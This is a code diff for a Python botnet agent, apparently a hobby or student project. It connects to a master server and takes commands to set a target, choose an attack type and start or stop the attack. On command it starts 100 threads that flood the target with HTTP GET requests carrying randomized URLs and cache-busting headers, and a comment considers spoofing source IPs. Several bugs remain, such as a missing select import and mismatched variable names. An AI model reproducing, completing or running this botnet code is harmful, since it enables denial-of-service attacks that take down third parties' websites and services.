@@ -2,48 +2,120 @@ import socket
 import sys
 import string
 import http.client
+import argparse
+import threading
 from random import *
-from threading import *
 
+RECV_BUFFER = 4096
+ENCODING = 'utf-8'
 
 class Bot():
 
 	def __init__(self, server: str, port: int):
-		self.masterserver = server
-		self.masterport = port
+		self.master_server = server
+		self.master_port = port
 		self.sock: socket.socket = None
-		self.masterserver: socket.socket = None
+		self.master_socket: socket.socket = None
+		self.authenticated = False
+		self.socket_list: list[socket.socket] = []
+		self.target_address: str = ''
+		self.attk_type: int = 0
+		self.attacking: bool = False
+
 		
 	def start(self):
 		self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
-		self.sock.connect((masterserver, masterport))
-		#print if connect successful or not?
-		#if not, then print error and close?
-		self.sock.listen()        
-		#recv request "whoami" right away?
-		self.sock.send("iam:bot")
+		self.sock.connect((master_server, master_port))
+		self.sock.listen()
+		print(f"connected to master server at {self.master_server}:{self.master_port}")    
+
 		try:
 			while True:
-				#wait for instructions
-				#if message = attack type 1
-					target =                        #target is IP/website from "attack" message?
-					port = 
-					t = RequestAttack(target, port)
-					t.run()
-				
-				#if message = attack type 2
+				read_sockets, _, exception_sockets = select.select(
+					self.socket_list, [], self.socket_list
+				)
 
-				#if message = disconnect, leave while loop
-		
+				for notified_socket in read_sockets:
+					self._request_router(notified_socket)
+
+				for notified_socket in exception_sockets:
+					self._disconnect_wrapper(notified_socket)
+
+		except KeyboardInterrupt:
+			print('caught keyboard interrupt, exiting')
 		except Exception as e:
 			print(f'ran into an error:\n\t{e}')
 		finally:
 			self.sock.close()
 			sys.exit()
 
+	def _request_router(self, sock: socket.socket):                        
+		sock_addr = sock.getpeername()
+		recv_data = sock.recv(RECV_BUFFER).decode(ENCODING)
+		print(f'received request from ${sock_addr}')
+		try:
+			if recv_data:
+				try:
+					request = recv_data.split(":")
+					if request[0] == 'whoami':
+						self.master_socket = sock   
+						self.sock.send("iam:bot".encode(ENCODING))
+					elif request[0] == 'iam':
+						if request[1] == 'error':                           
+							print("iam command error:", request[2])
+						elif request[1] == 'success': 
+							self.authenticated = True
+					elif request[0] == 'changeip':
+						self.target_address = request[1]
+					elif request[0] == 'changattk':
+						self.attack_type = int(request[1])
+					elif request[0] == 'startattk':          
+						self.attacking = True
+						if self.attack_type == 1:
+							for _ in range(100):										#creates 100 threeads that run a while True loop, but Bot can keep recv-ing
+								t = threading.Thread(target=self.attack1)	
+								t.start()
 
-	def attack2(self, host, port):
-		#spoof source IP? fake_ip()
+						#if self.attack_type == 2:
+							#run attack #2
+					elif request[0] == 'stopattk':
+						self.attacking = False
+					else:
+						print(
+							f'Cannot handle request from {sock_addr}\nrequest:{recv_data}'
+						)
+						response = f'{request[0]}:error:cannot handle request'.encode(
+							ENCODING)
+						sock.send(response)
+				except ValueError:
+					print(f'cannot parse request!')
+					response = '_:error:cannot parse request'.encode(ENCODING)
+					sock.send(response)
+			# No data received means that client closed gracefully
+			else:
+				self._disconnect_wrapper(sock)
+		# Abrupt client disconnect
+		except Exception as e:
+			print(e)
+			self._disconnect_wrapper(sock)
+		return
+
+	def _disconnect_wrapper(self, sock: socket.socket):
+		self.socket_list.remove(sock)
+		sock_addr = sock.getpeername()
+		sock_addr_str = '' + sock_addr[0] + str(sock_addr[1])
+		print(f'master server {sock_addr_str} disconnected')
+		self.sock.close()
+		sys.exit()
+
+	def attack1(self):
+		attack = RequestAttack(self.target_address)       
+		while self.attacking == True:							
+			attack.run()
+
+		
+	#def attack2(self, host, port):
+		#spoof source IP? fake_ip()p
 
 		#do attack on host:port
 
@@ -52,10 +124,9 @@ class Bot():
 
 class RequestAttack():
 	
-	def __init__(self, target: str, port: int):
+	def __init__(self, target: str):         
 		self.target = target
-		self.port = port
-
+	
 	def header(self):                                   
 		cachetype = ['no-cache','no-store','max-age='+str(randint(0,10)),'max-stale='+str(randint(0,100)),'min-fresh='+str(randint(0,10)),'notransform','only-if-cache']
 		acceptEc = ['compress,gzip','','*','compress;q=0,5, gzip;q=1.0','gzip;q=1.0, indentity; q=0.5, *;q=0']
@@ -102,21 +173,13 @@ class RequestAttack():
 	def create_url(self):								### creates random url by adding '?' + randomstring
 		return self.target + '?' + self.rand_str()
 
-	def run(self):
-		try:
-			if port == 443:
-				connection = http.client.HTTPSConnection(target, port)
-				print("connected to %s %d" %(target, port))
-			else:
-				connection = http.client.HTTPConnection(target, port)
-				print("connected to %s %d" %(target, port))
-			
+	def run(self):                                                          
+		try:	
+			connection = http.client.HTTPConnection(target)		
 			url = self.create_url()
 			http_header = self.header()
 			method = 'GET' #method = choice(['get','post'])
 			connection.request(method, url, None, http_header)
-			response = connection.getresponse()
-			print("Status: {} and reason: {}".format(response.status, response.reason))
 			connection.close()
 		except KeyboardInterrupt:
 			sys.exit(print('Canceled by user'))
@@ -127,7 +190,10 @@ class RequestAttack():
 ''' End of referenced code'''
 			
 if __name__ == "__main__":
-	server = 
-	port = 
-	bot = Bot(server, port)
-	Bot.start()
+	parser = argparse.ArgumentParser(description = 'Bot Agent')
+	parser.add_argument('host', help='Interface the Bot connects to')
+	parser.add_argument('-p', metavar='PORT', type=int, default=8080,
+						help='TCP port (default 8080)')
+	args = parser.parse_args()
+	bot = Bot(args.host, args.p)
+	bot.start()
